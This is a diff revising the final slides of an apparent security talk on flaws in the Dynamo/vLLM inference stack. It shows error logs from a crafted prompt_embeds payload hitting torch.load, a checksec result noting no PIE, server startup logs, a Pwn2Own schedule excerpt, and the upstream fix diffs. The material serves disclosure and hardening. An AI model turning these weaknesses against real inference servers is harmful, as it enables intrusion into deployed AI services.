+{"message":"Failed to fold completions stream for 0cd43495-4ceb-4491-aa19-f6af160a8e96: unknown variant `error: Invalid prompt_embeds: Failed to decode prompt_embeds as PyTorch tensor: Weights only load failed. In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.\nPlease file an issue with the following so that we can make `weights_only=True` compatible with your use case: WeightsUnpickler error: \n\nOnly persistent_load of storage is allowed, but got tensor([
+       1,        2,        3,
+       4,        5,        6,
+       7,        8,        9,
+      10,        9,       97,
+      322170851, 4285345213156097082, 110425377238528,
+      33,        0,        0,
+       0,        0])\n\nCheck the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.`, expected one of `eos`, `length`, `stop`, `error`, `cancelled`, `content_filter` at line 1 column 1276","type":"Internal Server Error","code":500}
+
+2026-07-11T11:24:25.730426Z  INFO dynamo_runtime::pipeline::network::manager: TCP request plane server started actual_addr=172.31.2.19:33777 actual_port=33777
+2026-07-11T11:24:25.730442Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Registered endpoint 'unload_lora' with shared TCP server on 172.31.2.19:337
+2026-07-11T11:24:25.730484Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Registered endpoint 'list_loras' with shared TCP server on 172.31.2.19:3377
+2026-07-11T11:24:25.730492Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Registered endpoint 'clear_kv_blocks' with shared TCP server on 172.31.2.19
+2026-07-11T11:24:25.730509Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Registered endpoint 'load_lora' with shared TCP server on 172.31.2.19:33777
+2026-07-11T11:24:25.730550Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Registered endpoint 'generate' with shared TCP server on 172.31.2.19:33777
+2026-07-11T11:24:43.720486Z  ERROR handlers._decode_prompt_embeds: Failed to decode prompt_embeds: Weights only load failed. In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
+Please file an issue with the following so that we can make `weights_only=True` compatible with your use case: WeightsUnpickler error:
+
+Only persistent_load of storage is allowed, but got tensor([
+       1,        2,        3,
+       4,        5,        6,
+       7,        8,        9,
+      10,        9,       97,
+      322170851, 4285345213156097082, 110425377238528,
+      33,        0,        0,
+       0,        0])
+
+Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.
+2026-07-11T11:24:43.720552Z  ERROR handlers._build_prompt_from_request: Failed to process prompt_embeds for request 0cd43495-4ceb-4491-aa19-f6af160a8e96: Failed to decode prompt_embeds: Weights only load failed. In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
+Please file an issue with the following so that we can make `weights_only=True` compatible with your use case: WeightsUnpickler error:
+
+Only persistent_load of storage is allowed, but got tensor([
+       1,        2,        3,
+       4,        5,        6,
+       7,        8,        9,
+      10,        9,       97,
+      322170851, 4285345213156097082, 110425377238528,
+      33,        0,        0,
+       0,        0])
+
+Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.
+```
+
+134
 
 ## Slide 135
 
 ### 🤣 **No PIE too!**
 
+```text
+dynamo@gpu-v100:/workspace$ checksec --file=/opt/dynamo/venv/bin/python
+```
+
+| RELRO | STACK CANARY | NX | PIE | RPATH | RUNPATH | Symbols | FORTIFY | Fortified | Fortifiable | FILE |
+| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
+| Partial RELRO | Canary found | NX enabled | No PIE | No RPATH | No RUNPATH | No Symbols | Yes | 15 | 38 | /opt/dynamo/venv/bin/python |
+
 135
 
 ## Slide 136
 
-136
-
-
-> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
+*Terminal window with two tabs, both titled "dynamo@iv-yeqdb0q6m8ay8n848rzf: /workspace — ssh root@118.196.114.94".*
 
 ```text
-~ — dynamo@iv-yeqdb0q6m8ay8n848rzf: jworkspace — ssh root@118.196.114.94 dynamo@iv-yeqdb0qém8ay8n848rzf: /workspace — ssh root@118.196.114.94 +
-INFO torch.compile takes 6.59 s in total
-NFC Available KV cache memory: 17.42 GiB
-GPU KV cache size: 163,088 tokens
-Maximum concurrency for 40,96@ tokens per request: 3.98x
-NIXL is available
-NF Creating v1 connector with name: NixlConnector and engine_id: 9142c798-383c-4a95-971f-6641ad72d@cb
-Initializing KVConnectorBase_V1. This API is experimental and subject to change in the future as we iterate the design.
-NF Initializing NIXL wrapper
-INFO Initializing NIXL worker 9142c798-383c-4a95-971f-6641ad72d@cb
-2026-07-11 11:51:27 NIXL INFO _api.py:363 Backend UCX was instantiated
-2026-07-11 11:51:27 NIXL INFO _api.py:253 Initialized NIXL agent: 9a5bec44-89b8-4ee8-874d-808d424dedee
-INFO NixlConnector setting KV cache layout to HND for better xfer performance.
-INFO Registering KV_Caches. use_mla: False, kv_buffer_device: cuda, use_host_buffer: False
-Capturing CUDA graphs (mixed prefill-decode, PIECEWISE): 100%s| I]t]. mm” | 51/51 [00:01<00:00, 27.32it/s]
-Capturing CUDA graphs (decode, FULL): 10076 | i” | 35/35 [30:01<00:00, 27.57it/s]
-INFO Graph capturing finished in 4 secs, took @.47 GiB
-NF init engine (profile, create kv cache, warmup model) took 15.5@ seconds
-INFO NIXL is available
-NF Creating v1 connector with name: NixlConnector and engine_id: 9142c798-383c-4a95-971f-6641ad72d@cb
-Initializing KVConnectorBase_V1. This API is experimental and subject to change in the future as we iterate the design.
-INF Initializing NIXL Scheduler 9142c798-383c-4a95-971f-6641ad72d@cb
-) Starting ZMQ publisher thread
-Asynchronous scheduling is enabled.
-O @7-11 11:51:40 [nixl_connector.py:97] NIXL is available
-INF VllmWorker for Qwen/Qwen3-@.6B has been initialized
-INFO VllmEngineMonitor initialized and health check task started.
-INFO KV event publisher for dp_rank=@ subscribing to vLLM at tcp://127.0.0.1:20080
-Initializing KvEventPublisher for worker 7587896117485211144 in component backend
-Worker reading KV events for dp_rank=@ from tcp://127.0.0.1:20080
-Registered engine routes: /engine/sleep, /engine/wake_up
-Registering model with endpoint types: chat, completions
-NF Getting engine runtime configuration metadata from vLLM engine for chat,completions..
-INFO Cache config values: {'num_gpu_blocks': 10193}
-NF Scheduler config values: {'max_num_seqs': 256, 'max_num_batched_tokens': 2048}
-INFO KvStoreDiscovery::register: EventChannel bucket=v1/event_channels, key=dynamo//kv_metrics/694d9f5103458e08
-Cannot connect to ModelExpress server: Transport error: transport error. Using direct download.
-Downloading model 'Qwen/Qwen3-@.6B' using provider: Hugging Face
-Downloading model from Hugging Face: Qwen/Qwen3-0.6B
-Using cache directory: "/home/dynamo/.cache/huggingface/hub"
-EventPublisher registered with discovery topic=kv_metrics transport=Nats instance_id=7587896117485211144
-Got model info: RepoInfo { siblings: [Siblings { rfilename: ".gitattributes" }, Siblings { rfilename: "LICENSE" }, Siblings { rf
-ilename: "README.md" }, Siblings { rfilename: "config.json" }, Siblings { rfilename: "generation_config.json" }, Siblings { rfilename: "merges.txt" }, Siblings { rfilename: "model.safetensors" }, Siblings {
-rfilename: "tokenizer.json" }, Siblings { rfilename: "tokenizer_config.json" }, Siblings { rfilename: "vocab.json" }], sha: "c1899de289a04d1210@db370d81485cdf75e47ca" }
-INFO Downloaded model files for Qwen/Qwen3-0.6B
-INF ModelExpress download completed successfully for model: Qwen/Qwen3-0.6B
-INFO Registered base model 'Qwen/Qwen3-@.6B' MDC
-NF Creating TCP request plane server bind_addr=172.31.2.19:@ port_source="0S-assigned"
-Initializing TCP server with dispatcher (concurrency=1500, queue=6000)
-Started TCP worker dispatcher with concurrency limit 1500
-Binding TCP server to 172.31.2.19:0
-TCP server bound successfully requested=172.31.2.19:@ actual=172.31.2.19:44251
-TCP request plane server started actual_addr=172.31.2.19:44251 actual_port=44251
-Registered endpoint 'clear_kv_blocks' with shared TCP server on 172.31.2.19:44251
-Registered endpoint 'load_lora' with shared TCP server on 172.31.2.19:44251
-Registered endpoint 'unload_lora' with shared TCP server on 172.31.2.19:44251
-INF Registered endpoint 'list_loras' with shared TCP server on 172.31.2.19:44251 136
-INFO Registered endpoint 'generate' with shared TCP server on 172.31.2.19:44251
+2026-07-11T11:51:26.364311Z  INFO monitor.end_monitoring_torch_compile: torch.compile takes 6.59 s in total
+2026-07-11T11:51:27.023859Z  INFO gpu_worker.determine_available_memory: Available KV cache memory: 17.42 GiB
+2026-07-11T11:51:27.290041Z  INFO kv_cache_utils._report_kv_cache_config: GPU KV cache size: 163,088 tokens
+2026-07-11T11:51:27.290151Z  INFO kv_cache_utils._report_kv_cache_config: Maximum concurrency for 40,960 tokens per request: 3.98x
+2026-07-11T11:51:27.298184Z  INFO nixl_connector: NIXL is available
+2026-07-11T11:51:27.300624Z  INFO factory.create_connector: Creating v1 connector with name: NixlConnector and engine_id: 9142c798-383c-4a95-971f-6641ad72d0cb
+2026-07-11T11:51:27.300682Z  WARN base.__init__: Initializing KVConnectorBase_V1. This API is experimental and subject to change in the future as we iterate the design.
+2026-07-11T11:51:27.300714Z  INFO nixl_connector.__init__: Initializing NIXL wrapper
+2026-07-11T11:51:27.300737Z  INFO nixl_connector.__init__: Initializing NIXL worker 9142c798-383c-4a95-971f-6641ad72d0cb
+(Worker pid=9670) 2026-07-11 11:51:27 NIXL INFO     _api.py:363 Backend UCX was instantiated
+(Worker pid=9670) 2026-07-11 11:51:27 NIXL INFO     _api.py:253 Initialized NIXL agent: 9a5bec44-89b8-4ee8-874d-808d424d0de0
+2026-07-11T11:51:27.704028Z  INFO nixl_connector.get_required_kvcache_layout: NixlConnector setting KV cache layout to HND for better xfer performance.
+2026-07-11T11:51:27.712378Z  INFO nixl_connector.register_kv_caches: Registering KV_Caches. use_mla: False, kv_buffer_device: cuda, use_host_buffer: False
+Capturing CUDA graphs (mixed prefill-decode, PIECEWISE): 100%|████████████████████| 51/51 [00:01<00:00, 27.32it/s]
+Capturing CUDA graphs (decode, FULL): 100%|████████████████████████████████████████| 35/35 [00:01<00:00, 27.57it/s]
+2026-07-11T11:51:31.583293Z  INFO gpu_model_runner.capture_model: Graph capturing finished in 4 secs, took 0.47 GiB
+2026-07-11T11:51:31.599819Z  INFO core._initialize_kv_caches: init engine (profile, create kv cache, warmup model) took 15.50 seconds
+2026-07-11T11:51:39.992593Z  INFO nixl_connector: NIXL is available
+2026-07-11T11:51:39.995116Z  INFO factory.create_connector: Creating v1 connector with name: NixlConnector and engine_id: 9142c798-383c-4a95-971f-6641ad72d0cb
+2026-07-11T11:51:39.995163Z  WARN base.__init__: Initializing KVConnectorBase_V1. This API is experimental and subject to change in the future as we iterate the design.
+2026-07-11T11:51:39.995509Z  INFO nixl_connector.__init__: Initializing NIXL Scheduler 9142c798-383c-4a95-971f-6641ad72d0cb
+2026-07-11T11:51:39.996392Z  INFO kv_events.__init__: Starting ZMQ publisher thread
+2026-07-11T11:51:40.242077Z  INFO vllm.__post_init__: Asynchronous scheduling is enabled.
+INFO 07-11 11:51:40 [nixl_connector.py:97] NIXL is available
+2026-07-11T11:51:40.374960Z  INFO main.setup_vllm_engine: VllmWorker for Qwen/Qwen3-0.6B has been initialized
+2026-07-11T11:51:40.375044Z  INFO engine_monitor.__init__: VllmEngineMonitor initialized and health check task started.
+2026-07-11T11:51:40.375110Z  INFO main.setup_kv_event_publisher: KV event publisher for dp_rank=0 subscribing to vLLM at tcp://127.0.0.1:20080
+2026-07-11T11:51:40.375139Z  INFO dynamo_llm::kv_router::publisher: Initializing KvEventPublisher for worker 7587896117485211144 in component backend
+2026-07-11T11:51:40.375218Z  INFO main.setup_kv_event_publisher: Worker reading KV events for dp_rank=0 from tcp://127.0.0.1:20080
+2026-07-11T11:51:40.375539Z  INFO main.init: Registered engine routes: /engine/sleep, /engine/wake_up
+2026-07-11T11:51:40.375576Z  INFO main.init: Registering model with endpoint types: chat,completions
+2026-07-11T11:51:40.375648Z  INFO main.register_vllm_model: Getting engine runtime configuration metadata from vLLM engine for chat,completions...
+2026-07-11T11:51:40.375689Z  INFO main.get_engine_cache_info: Cache config values: {'num_gpu_blocks': 10193}
+2026-07-11T11:51:40.375719Z  INFO main.get_engine_cache_info: Scheduler config values: {'max_num_seqs': 256, 'max_num_batched_tokens': 2048}
+2026-07-11T11:51:40.376195Z  INFO dynamo_runtime::discovery::kv_store: KVStoreDiscovery::register: EventChannel bucket=v1/event_channels, key=dynamo//kv_metrics/694d9f5103458e08
+2026-07-11T11:51:40.376340Z  WARN dynamo_llm::hub: Cannot connect to ModelExpress server: Transport error: transport error. Using direct download.
+2026-07-11T11:51:40.376364Z  INFO modelexpress_common::download: Downloading model 'Qwen/Qwen3-0.6B' using provider: Hugging Face
+2026-07-11T11:51:40.376376Z  INFO modelexpress_common::providers::huggingface: Downloading model from Hugging Face: Qwen/Qwen3-0.6B
+2026-07-11T11:51:40.376397Z  INFO modelexpress_common::providers::huggingface: Using cache directory: "/home/dynamo/.cache/huggingface/hub"
+2026-07-11T11:51:40.377261Z  INFO dynamo_runtime::transports::event_plane: EventPublisher registered with discovery topic=kv_metrics transport=Nats instance_id=7587896117485211144
+2026-07-11T11:51:43.109677Z  INFO modelexpress_common::providers::huggingface: Got model info: RepoInfo { siblings: [Siblings { rfilename: ".gitattributes" }, Siblings { rfilename: "LICENSE" }, Siblings { rfilename: "README.md" }, Siblings { rfilename: "config.json" }, Siblings { rfilename: "generation_config.json" }, Siblings { rfilename: "merges.txt" }, Siblings { rfilename: "model.safetensors" }, Siblings { rfilename: "tokenizer.json" }, Siblings { rfilename: "tokenizer_config.json" }, Siblings { rfilename: "vocab.json" }], sha: "c1899de289a04d12100db370d81485cdf75e47ca" }
+2026-07-11T11:51:43.109897Z  INFO modelexpress_common::providers::huggingface: Downloaded model files for Qwen/Qwen3-0.6B
+2026-07-11T11:51:43.109972Z  INFO dynamo_llm::hub: ModelExpress download completed successfully for model: Qwen/Qwen3-0.6B
+2026-07-11T11:51:43.113917Z  INFO _core: Registered base model 'Qwen/Qwen3-0.6B' MDC
+2026-07-11T11:51:43.115133Z  INFO dynamo_runtime::pipeline::network::manager: Creating TCP request plane server bind_addr=172.31.2.19:0 port_source="OS-assigned"
+2026-07-11T11:51:43.115152Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Initializing TCP server with dispatcher (concurrency=1500, queue=6000)
+2026-07-11T11:51:43.115167Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Started TCP worker dispatcher with concurrency limit 1500
+2026-07-11T11:51:43.115174Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Binding TCP server to 172.31.2.19:0
+2026-07-11T11:51:43.115201Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: TCP server bound successfully requested=172.31.2.19:0 actual=172.31.2.19:44251
+2026-07-11T11:51:43.115211Z  INFO dynamo_runtime::pipeline::network::manager: TCP request plane server started actual_addr=172.31.2.19:44251 actual_port=44251
+2026-07-11T11:51:43.115228Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Registered endpoint 'clear_kv_blocks' with shared TCP server on 172.31.2.19:44251
+2026-07-11T11:51:43.115236Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Registered endpoint 'load_lora' with shared TCP server on 172.31.2.19:44251
+2026-07-11T11:51:43.115249Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Registered endpoint 'unload_lora' with shared TCP server on 172.31.2.19:44251
+2026-07-11T11:51:43.115263Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Registered endpoint 'list_loras' with shared TCP server on 172.31.2.19:44251
+2026-07-11T11:51:43.115352Z  INFO dynamo_runtime::pipeline::network::ingress::shared_tcp_endpoint: Registered endpoint 'generate' with shared TCP server on 172.31.2.19:44251
 ```
+
+136
 
 ## Slide 137
 
 ### **This Target Remains Unchallenged**
 
+**Pwn2Own Berlin 2026: The Full Schedule**
+
+**MAY 13, 2026**
+
+**DUSTIN CHILDS**
+
+Willkommen! (Welcome!) Pwn2Own Berlin 2026 has arrived at OffensiveCon, and the world's top security researchers are ready. This year's enterprise-focused competition features AI Databases, Coding Agents, Local Inferences, and a separate category for NVIDIA products.
+
+Earlier today, we held the random draw to determine attempt order. Below is the official schedule. All times are Berlin local time (CET) and may change as the competition progresses. Check back for live updates.
+
+In case you missed it, you can watch the draw here.
+
 137
 
 https://www.zerodayinitiative.com/blog/2026/5/13/pwn2own-berlin-2026-the-full-schedule
-
-
-> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“This Target Remains Unchallenged
-Pwn2Own Berlin 2026: The Full Schedule
-f MAY 13, 2026
-& DUSTIN CHILDS
-Willkommen! (Welcome!) Pwn2Own Berlin 2026 has arrived at OffensiveCon, and the world’s top security researchers
-are ready. This year’s enterprise-focused competition features Al Databases, Coding Agents, Local Inferences, and a
-separate category for NVIDIA products.
-Earlier today, we held the random draw to determine attempt order. Below is the official schedule. All times are Berlin
-local time (CET) and may change as the competition progresses. Check back for live updates.
-In case you missed it, you can watch the draw here.
-https://www.zerodayinitiative.com/blog/2026/5/13/pwn2own-berlin-2026-the-full-schedule
-```
 
 ## Slide 138
 
 **Fix**
 
-138
+*GitHub diff — file* `components/src/dynamo/vllm/handlers.py` *(+16), unreviewed*
 
-https://github.com/ai-dynamo/dynamo/pull/8248/changes
+```diff
+@@ -1351,6 +1351,22 @@ def _build_prompt_from_request(
+        embedding_sequence_length = None
 
-
-> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-a
-a @@ -1351,6 +1351,22 @@ def _build_prompt_from_request (
-1351 embedding_sequence_length = None
-1352
-1353 if “prompt_embeds" in request and
-1354 trv:
-1351
-1352
-1353
-1354
-1355
-1356
-1357
-1358
-1359
-1360
-1361
-1362
-1363
-1364
-1365
-1366
-1367
-1368
-1369
-1370
-embedding_sequence_length = None
-if "prompt_embeds" in request and
-request ["prompt_embeds"]:
-if not
-self.config.engine_args.enable_prompt_embeds:
-"Set
-*--enable-prompt-embeds* to allow
-‘prompt_embeds* in request."
-{log_prefix. lower().strip() or 'request'} "
-)
-logger.e
-f"Rejected prompt_embeds for
-f"{request_id}: {msg}"
-)
-return (
-None
-None
-{
-prompt_embeds: {msg}",
-trv:
-rror(
-“finish_reason": f"error: Invalid
-“token_ids":
-https://github.com/ai-dynamo/dynamo/pull/8248/changes
-138
+        if "prompt_embeds" in request and request["prompt_embeds"]:
++            if not self.config.engine_args.enable_prompt_embeds:
++                msg = (
++                    "Set `--enable-prompt-embeds` to allow `prompt_embeds` in request."
++                )
++                logger.error(
++                    f"Rejected prompt_embeds for {request_id}: {msg}"
++                )
++                return (
++                    None,
++                    None,
++                    {
++                        "finish_reason": f"error: Invalid prompt_embeds: {msg}",
++                        "token_ids": [],
++                    },
++                )
+            try:
 ```
+
+138
+
+https://github.com/ai-dynamo/dynamo/pull/8248/changes
 
 ## Slide 139
 
 **Fix**
 
-139
+*GitHub diff — a separate hunk adds an import at line 20:*
 
-https://github.com/ai-dynamo/dynamo/pull/8228/changes
-
-
-> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-a
-F
-Ix
-1124
-1125
-1126
-1127
-1128
-1129
-1130
-1131
-1132
-1133
-1134
-1135
-1136
-1137
-1138
-1139
-1140
-1141
-1142
-buffer = io.BytesI0(embeds_bytes)
-embeddings_tensor = torch. load(buffer,
-weights_only=True)
-# Step 3: Validate it's a tensor
-if not isinstance(embeddings_tensor,
-raise ValueError(
-f"prompt_embeds must be a torch.Tensor,
-got {type(embeddings_tensor) }"
-)
-f"Decoded PyTorch format embeddings: shape=
-{embeddings_tensor.shape}, "
-f"dtype={embeddings_tensor.dtype}, size=
-{len(embeds_bytes)} bytes"
-) 1124
-1125
-return embeddings_tensor 1126
-1127
-1128
-except binascii.Error as e: 1129
-logger.error(f"Invalid base64 encoding in 1130
-prompt_embeds: {e}")
-raise ValueError(f"Invalid base64 encoding in 1131
-prompt_embeds: {e}")
-1132
-+
-20 + from vllm.renderers.embed_utils import
-safe_load_prompt_embeds
-> Comment on lines R1121 to R1124 Resolved
-if self.model_config is None:
-raise ValueError("ModelConfig is unavailable for
-prompt_embeds validation.")
-try:
-return safe_load_prompt_embeds(
-self.model_config,
-prompt_embeds_base64.encode()
-)
-https://github.com/ai-dynamo/dynamo/pull/8228/changes
-139
+```diff
++ from vllm.renderers.embed_utils import safe_load_prompt_embeds
 ```
+
+*Below, a split diff view: deletions on the left, additions on the right, sharing one context line. A resolved review thread "Comment on lines R1121 to R1124" is attached at that context line.*
+
+```diff
+-            buffer = io.BytesIO(embeds_bytes)
+-            embeddings_tensor = torch.load(buffer, weights_only=True)
+-
+-            # Step 3: Validate it's a tensor
+-            if not isinstance(embeddings_tensor, torch.Tensor):
+-                raise ValueError(
+-                    f"prompt_embeds must be a torch.Tensor, got {type(embeddings_tensor)}"
+-                )
+-
+-            logger.debug(
+-                f"Decoded PyTorch format embeddings: shape={embeddings_tensor.shape}, "
+-                f"dtype={embeddings_tensor.dtype}, size={len(embeds_bytes)} bytes"
+-            )
+             )
+
++            if self.model_config is None:
++                raise ValueError("ModelConfig is unavailable for prompt_embeds validation.")
++
++            try:
++                return safe_load_prompt_embeds(
++                    self.model_config,
++                    prompt_embeds_base64.encode()
++                )
+
+-            return embeddings_tensor
+
+-        except binascii.Error as e:
+-            logger.error(f"Invalid base64 encoding in prompt_embeds: {e}")
+-            raise ValueError(f"Invalid base64 encoding in prompt_embeds: {e}")
+```
+
+139
+
+https://github.com/ai-dynamo/dynamo/pull/8228/changes
 
 ## Slide 140
 
-# Summary
+### PART 05
+
+Summary
 
 140
 
 ## Slide 141
 
+*Diagram: a dashed box labeled **Previous cognition** contains a solid box **Model poisoning** ("Known attack vector"). Two dashed arrows point down from it, under the label **New findings**, to two boxes: **Embeds input** ("Input-level manipulation") and **Dynamic model** ("Runtime model switching").*
+
 141
-
-
-> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-a
-Previous cognition
-Model poisoning
-Known attack vector
-New findings
-Embeds input
-Input-level manipulation
-Dynamic model
-Runtime model switching
-141
-```
 
 ## Slide 142
 
 As more and more people focus on AI security, simple Python-level vulnerabilities will become increasingly rare.
 
-## **Summary**
+### **Summary**
 
 However, for performance reasons, many low-level AI components still have to be implemented in C/C++.
 
@@ -4267,6 +4325,7 @@ As a result, memory vulnerabilities will gradually attract more attention in the
 
 2026
 
-# Thanks
+### Thanks
 
 143
+
